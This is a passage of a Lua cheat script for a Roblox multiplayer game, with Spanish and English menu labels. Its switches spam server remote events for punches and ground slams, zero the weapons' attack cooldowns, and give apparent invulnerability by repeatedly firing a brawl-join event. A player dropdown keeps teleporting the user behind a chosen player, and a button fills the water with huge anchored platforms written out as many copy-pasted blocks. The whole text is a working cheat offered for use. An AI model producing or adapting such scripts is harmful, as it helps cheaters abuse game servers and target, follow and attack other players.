    if _G.CharacterToolAddedConnection then
        _G.CharacterToolAddedConnection:Disconnect()
        _G.CharacterToolAddedConnection = nil
    end
    if _G.CharacterAddedConnection then
        _G.CharacterAddedConnection:Disconnect()
        _G.CharacterAddedConnection = nil
    end
end

Killer:AddButton("Recover Punch Anim", function()
    RecoveryPunch()
end)

Killer:AddSwitch("Auto Equip Punch", function(state)
	autoEquipPunch = state
	task.spawn(function()
		while autoEquipPunch do
			local punch = LocalPlayer.Backpack:FindFirstChild("Punch")
			if punch then
				punch.Parent = LocalPlayer.Character
			end
			task.wait(0.1)
		end
	end)
end)

Killer:AddSwitch("Auto golpear [sin animación]", function(state)
	autoPunchNoAnim = state
	task.spawn(function()
		while autoPunchNoAnim do
			local punch = LocalPlayer.Backpack:FindFirstChild("Punch") or LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Punch")
			if punch then
				if punch.Parent ~= LocalPlayer.Character then
					punch.Parent = LocalPlayer.Character
				end
				LocalPlayer.muscleEvent:FireServer("punch", "rightHand")
				LocalPlayer.muscleEvent:FireServer("punch", "leftHand")
			else
				autoPunchNoAnim = false
			end
			task.wait(0.01)
		end
	end)
end)

Killer:AddSwitch("Auto Punch", function(state)
	_G.fastHitActive = state
	if state then
		task.spawn(function()
			while _G.fastHitActive do
				local punch = LocalPlayer.Backpack:FindFirstChild("Punch")
				if punch then
					punch.Parent = LocalPlayer.Character
					if punch:FindFirstChild("attackTime") then
						punch.attackTime.Value = 0
					end
				end
				task.wait(0.1)
			end
		end)
		task.spawn(function()
			while _G.fastHitActive do
				local punch = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Punch")
				if punch then
					punch:Activate()
				end
				task.wait(0.1)
			end
		end)
	else
		local punch = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Punch")
		if punch then
			punch.Parent = LocalPlayer.Backpack
		end
	end
end)

Killer:AddSwitch("golpe rápido", function(state)
	_G.autoPunchActive = state
	if state then
		task.spawn(function()
			while _G.autoPunchActive do
				local punch = LocalPlayer.Backpack:FindFirstChild("Punch")
				if punch then
					punch.Parent = LocalPlayer.Character
					if punch:FindFirstChild("attackTime") then
						punch.attackTime.Value = 0
					end
				end
				task.wait()
			end
		end)
		task.spawn(function()
			while _G.autoPunchActive do
				local punch = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Punch")
				if punch then
					punch:Activate()
				end
				task.wait()
			end
		end)
	else
		local punch = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Punch")
		if punch then
			punch.Parent = LocalPlayer.Backpack
		end
	end
end)



local godModeToggle = false
Killer:AddSwitch("modo dios (esperar peleas)", function(State)
    godModeToggle = State
    if State then
        task.spawn(function()
            while godModeToggle do
                game:GetService("ReplicatedStorage").rEvents.brawlEvent:FireServer("joinBrawl")
                task.wait()
            end
        end)
    end
end)
-- 📌 Teleport / Follow System (versión auto-follow desde Dropdown)

-- 📌 Auto Follow (TP detrás del jugador en vez de caminar)
local following = false
local followTarget = nil

-- Función auxiliar: TP detrás del jugador
function followPlayer(targetPlayer)
    local myChar = LocalPlayer.Character
    local targetChar = targetPlayer.Character

    if not (myChar and targetChar) then return end
    local myHRP = myChar:FindFirstChild("HumanoidRootPart")
    local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")

    if myHRP and targetHRP then
        -- 📌 Calcular posición detrás del jugador (3 studs atrás)
        local followPos = targetHRP.Position - (targetHRP.CFrame.LookVector * 3)
        -- 📌 Teletransportar siempre recto
        myHRP.CFrame = CFrame.new(followPos, targetHRP.Position)
    end
end

-- Dropdown dinámico de jugadores
local followDropdown = Killer:AddDropdown("Seguir Jugador (TP)", function(selected)
    if selected and selected ~= "" then
        local target = Players:FindFirstChild(selected)
        if target then
            followTarget = target.Name
            following = true
            print("Started following:", target.Name)

            -- TP inmediato al seleccionarlo
            followPlayer(target)
        end
    end
end)

-- Inicializar lista de jugadores
for _, player in ipairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        followDropdown:Add(player.Name)
    end
end

-- Mantener lista actualizada
Players.PlayerAdded:Connect(function(player)
    if player ~= LocalPlayer then
        followDropdown:Add(player.Name)
    end
end)

Players.PlayerRemoving:Connect(function(player)
    followDropdown:Clear()
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            followDropdown:Add(plr.Name)
        end
    end
    if followTarget == player.Name then
        followTarget = nil
        following = false
    end
end)

-- Botón para dejar de seguir
Killer:AddButton("Dejar de Seguir", function()
    following = false
    followTarget = nil
    print("Stopped following")
end)

-- Loop de seguimiento automático
task.spawn(function()
    while true do
        task.wait(0.2) -- cada 0.2s para actualizar TP
        if following and followTarget then
            local target = Players:FindFirstChild(followTarget)
            if target then
                followPlayer(target)
            else
                following = false
                followTarget = nil
            end
        end
    end
end)

local godDamageActive = false

Killer:AddSwitch("Daño con Godmode", function(state)
    godDamageActive = state
    if state then
        task.spawn(function()
            while godDamageActive do
                local player = game.Players.LocalPlayer
                local groundSlam = player.Backpack:FindFirstChild("Ground Slam") or (player.Character and player.Character:FindFirstChild("Ground Slam"))

                if groundSlam then
                    -- Equipar
                    if groundSlam.Parent == player.Backpack then
                        groundSlam.Parent = player.Character
                    end

                    -- Quitar delay
                    if groundSlam:FindFirstChild("attackTime") then
                        groundSlam.attackTime.Value = 0
                    end

                    -- Lanzar evento
                    player.muscleEvent:FireServer("slam")

                    -- Activar herramienta
                    groundSlam:Activate()
                end

                task.wait(0.1) -- delay pequeño
            end
        end)
    end
end)



local button = Killer:AddButton("congelar el agua", function()
   
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(11, -9, 78)
    WalkPart.Size = Vector3.new(10000,0,10000)
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-110, -9,-999)
    WalkPart.Size = Vector3.new(10000,0,10000)
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-110, -9,1999)
    WalkPart.Size = Vector3.new(10000,0,10000)
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-110, -9,-1999)
    WalkPart.Size = Vector3.new(10000,0,10000)
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-110, -9,2999)
    WalkPart.Size = Vector3.new(10000,0,10000)
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-110, -9,-3999)
    WalkPart.Size = Vector3.new(10000,0,10000)
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-110, -9,4999)
    WalkPart.Size = Vector3.new(10000,0,10000)
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-110, -9,-5999)
    WalkPart.Size = Vector3.new(10000,0,10000)
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-110, -9,-6999)
    WalkPart.Size = Vector3.new(10000,0,10000)
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-110, -9,-7999)
    WalkPart.Size = Vector3.new(10000,0,10000)
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-110, -9,-8999)
    WalkPart.Size = Vector3.new(10000,0,10000)
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-110, -9,-9999)
    WalkPart.Size = Vector3.new(10000,0,10000)
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-110, -9,-10999)
    WalkPart.Size = Vector3.new(10000,0,10000)
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-110, -9,-11999)
    WalkPart.Size = Vector3.new(10000,0,10000)
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-110, -9,-12999)
    WalkPart.Size = Vector3.new(10000,0,10000)
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-110, -9,-13999)
    WalkPart.Size = Vector3.new(10000,0,10000)
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-110, -9,-14999)
    WalkPart.Size = Vector3.new(10000,0,10000)
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-110, -9,-15999)
    WalkPart.Size = Vector3.new(10000,0,10000)
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-110, -9,-16999)
    WalkPart.Size = Vector3.new(10000,0,10000)
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-110, -9,-17999)
    WalkPart.Size = Vector3.new(10000,0,10000)
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-110, -9,-18999)
    WalkPart.Size = Vector3.new(10000,0,10000)
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-110, -9,-19999)
    WalkPart.Size = Vector3.new(10000,0,10000)
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-110, -9,-20999)
    WalkPart.Size = Vector3.new(10000,0,10000)
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-110, -9,-21999)
    WalkPart.Size = Vector3.new(10000,0,10000)
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-110, -9,-22999)
    WalkPart.Size = Vector3.new(10000,0,10000)
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-110, -9,-23999)
    WalkPart.Size = Vector3.new(10000,0,10000)
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-8922.482421875, -9.848660469055176, -6233.65380859375)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-1107.2977294921875, - 9.7848615646362305, -4127.03369140625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-2054.99365234375, -9.43027928471565247, -5135.06201171875)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-3072.01806640625, -9.645418643951416, -6136.02392578125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-4088.711181640625, -9.43027925491333, -5125.28076171875)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-5100.0576171875, -9.215141296386719, -5128.03369140625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6103.42626953125, -9.000000953674316, -5590.5859375)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-7096.3935546875, -9.784859657287598, -6403.66015625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-9882.7021484375, -9.633520126342773, -5228.537109375)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-8889.23046875, -9.418381690979004, -4767.06689453125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-7888.4443359375, -9.203240394592285, -4648.048828125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6868.951171875, -9.988101005554199, -4124.4384765625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-5883.841796875, -9.7729620933532715, -4073.54736328125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-9873.0966796875, -9.26787185668945, -6775.55859375)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-8453.767578125, -9.26786804199219, -7212.89013671875)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-7482.234375, -9.84866714477539, -8082.72021484375)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6483.5791015625, -9.26786422729492, -9055.9033203125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-6561.2578125, -9.84867858886719, -10038.5146484375)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    
    
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(1009.69091796875, -9.11653518676758, 1046.963134765625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(2178.023681640625, -9.09156036376953, 287.1599426269531)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(1023.4569091796875, -9.784860134124756, -478.5546569824219)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(1416.96533203125, -9.901395559310913, 2066.506591796875)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(1514.3587646484375, -9.686256408691406, 3077.935791015625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(1624.8602294921875, -9.47111701965332, 4074.02587890625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(1687.230712890625, -9.255976676940918, 5069.81640625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(1655.4146728515625, -9.040838241577148, 6056.37451171875)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(650.4426879882812, -9.8256990909576416, 6532.1982421875)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(-347.35028076171875, -9.61055850982666, 6912.1591796875)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(218.79769897460938, -9.395420074462891, 7934.68017578125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(251.1740264892578, -9.1802825927734375, 8951.5595703125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(360.1578369140625, -9.9651424884796143, 9967.0107421875)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(488.1932067871094, -9.750001907348633, 10972.189453125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(569.8875732421875, -9.5348615646362305, 11982.7353515625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(629.5374755859375, -9.319723129272461, 12985.849609375)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(1664.9771728515625, -9.610558986663818, 7491.61181640625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(1945.2432861328125, -9.395420551300049, 8507.6533203125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(904.4902954101562, -9.7848610877990723, -2151.783447265625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(1890.2633056640625, -9.569720268249512, -2413.07421875)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(2895.560302734375, -9.354581356048584, -2546.12109375)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(3881.858642578125, -9.1394429206848145, -2962.385986328125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(4874.54833984375, -9.9243016242980957, -3218.8798828125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(5892.513671875, -9.709161758422852, -3338.171875)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(6886.39990234375, -9.505979061126709, -3488.1533203125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(7863.33056640625, -9.290840148925781, -3597.61279296875)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(8840.2548828125, -9.075700759887695, -3711.208740234375)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(9838.98046875, -9.8605616092681885, -3811.1064453125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(10812.9287109375, -9.645423412322998, -3987.937744140625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(11798.421875, -9.4302849769592285, -4059.906494140625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(12794.8408203125, -9.215145587921143, -4103.353515625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(13782.353515625, -9.000005722045898, -4253.642578125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(14800.7666015625, -9.7848663330078125, -4368.7177734375)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(15813.6171875, -9.569726467132568, -4453.31591796875)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(16818.390625, -9.354587078094482, -4569.81396484375)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(17821.248046875, -9.139448642730713, -4737.97509765625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(18001.896484375, -9.9243087768554688, -3764.74609375)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(17008.357421875, -9.709170341491699, -2794.70751953125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(16014.57421875, -9.49403190612793, -2500.1083984375)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(18766.751953125, -9.709169387817383, -2759.8818359375)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(19039.708984375, -9.494030475616455, -3743.810546875)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(18948.62890625, -9.494030475616455, -1756.02783203125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(17940.4921875, -9.2788920402526855, -755.4782104492188)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(18944.34375, -9.063753604888916, -543.2788696289062)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(16963.00390625, -9.063752174377441, -293.4074401855469)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(15998.7353515625, -9.8486130237579346, -1311.015869140625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(15591.837890625, -9.633473873138428, -296.08660888671875)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(14579.58203125, -9.4183349609375, -991.3533935546875)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(14294.275390625, -9.203196048736572, -221.879150390625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(13372.7236328125, -9.9880566596984863, 73.62410736083984)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(12783.056640625, -9.093517303466797, -952.5441284179688)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(2003.5675048828125, -9.569721221923828, -1103.451416015625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(2978.824951171875, -9.354583263397217, -1012.9195556640625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(3944.885986328125, -9.139444351196289, -958.9783935546875)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(4917.93212890625, -9.9243054389953613, -1106.58837890625)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(5321.544921875, -9.709166526794434, -1851.941162109375)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
    local WalkPart = Instance.new("Part")
    WalkPart.Parent = Game.Workspace
    WalkPart.Anchored = true
    WalkPart.Position = Vector3.new(2894.729736328125, -9.9243032932281494, -3897.88720703125)
    WalkPart.Size = Vector3.new(20000,0,20000)
    
    
